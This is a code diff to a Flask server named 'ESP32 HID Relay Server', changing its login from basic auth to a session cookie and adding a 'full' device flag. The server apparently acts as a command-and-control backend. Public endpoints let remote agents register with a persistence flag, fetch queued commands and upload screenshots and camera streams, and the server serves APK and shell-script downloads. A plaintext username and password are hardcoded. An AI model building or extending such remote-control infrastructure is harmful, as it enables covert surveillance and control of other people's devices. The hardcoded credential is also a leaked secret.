@@ -7,35 +7,43 @@ ESP32 HID Relay Server
 """
 from flask import Flask, request, jsonify, Response, stream_with_context
 import json, time, threading, collections, base64, urllib.request
-import subprocess, shutil, glob, os
+import subprocess, shutil, glob, os, secrets
 from functools import wraps
 
 app = Flask(__name__)
 
-# ── UI authentication ─────────────────────────────────────────────────────────
-_UI_USER = "mvdhamxa"
-_UI_PASS = "Mhm190012"
-
-def _requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or auth.username != _UI_USER or auth.password != _UI_PASS:
-            return Response("Authentication required",
-                            401, {"WWW-Authenticate": 'Basic realm="ESP32 HID Remote"'})
-        return f(*args, **kwargs)
-    return decorated
+# ── UI authentication (cookie-based, custom login overlay) ────────────────────
+_UI_USER    = "mvdhamxa"
+_UI_PASS    = "Mhm190012"
+_AUTH_TOKEN = secrets.token_hex(32)   # regenerated each server restart
+_AUTH_COOKIE = "esp_sess"
 
 @app.before_request
 def _check_auth():
-    # Public paths: agent callbacks, APK downloads, shell scripts
-    pub = ("/esp/", "/apk/", "/sh/", "/api/cam/stream")
-    if request.path == "/" or request.path.startswith("/api/"):
+    # Only guard /api/* — / is public so the HTML (with login overlay) always loads
+    # Agent endpoints /esp/, /apk/, /sh/ and the login route are always public
+    pub = ("/esp/", "/apk/", "/sh/", "/login", "/api/cam/stream")
+    if request.path.startswith("/api/"):
         if not any(request.path.startswith(p) for p in pub):
-            auth = request.authorization
-            if not auth or auth.username != _UI_USER or auth.password != _UI_PASS:
-                return Response("Authentication required",
-                                401, {"WWW-Authenticate": 'Basic realm="ESP32 HID Remote"'})
+            if request.cookies.get(_AUTH_COOKIE) != _AUTH_TOKEN:
+                return jsonify({"error": "unauthorized"}), 401
+
+@app.route("/login", methods=["POST"])
+def login():
+    data = request.get_json(silent=True) or {}
+    if data.get("username") == _UI_USER and data.get("password") == _UI_PASS:
+        secure = request.is_secure or request.headers.get("X-Forwarded-Proto") == "https"
+        resp = jsonify({"ok": True})
+        resp.set_cookie(_AUTH_COOKIE, _AUTH_TOKEN,
+                        httponly=True, samesite="Lax", secure=secure, max_age=86400*30)
+        return resp
+    return jsonify({"error": "Invalid credentials"}), 401
+
+@app.route("/logout", methods=["POST"])
+def logout():
+    resp = jsonify({"ok": True})
+    resp.delete_cookie(_AUTH_COOKIE)
+    return resp
 
 pending  = collections.deque()
 results  = collections.deque(maxlen=50)
@@ -63,6 +71,7 @@ def _dev(did):
             "pending": {"cmd": "", "id": 0},
             "history": collections.deque(maxlen=100),
             "persistent": False,
+            "full": False,
         }
     return _devices[did]
 
@@ -1087,6 +1096,8 @@ def esp_device_register():
         d["arch"]       = data.get("arch")     or d["arch"]
         d["ts"]         = time.time()
         d["persistent"] = data.get("persistent", d["persistent"])
+        if data.get("full") is not None:
+            d["full"] = bool(data.get("full"))
     return jsonify({"ok": True})
 
 @app.route("/esp/device-cmd")
@@ -1144,6 +1155,7 @@ def api_devices():
                 "online":        (now - d["ts"]) < 90,
                 "ago":           round(now - d["ts"]),
                 "persistent":    d["persistent"],
+                "full":          d.get("full", False),
                 "has_screenshot": d["screenshot"] is not None,
                 "screenshot_ts": d["screenshot_ts"],
             })
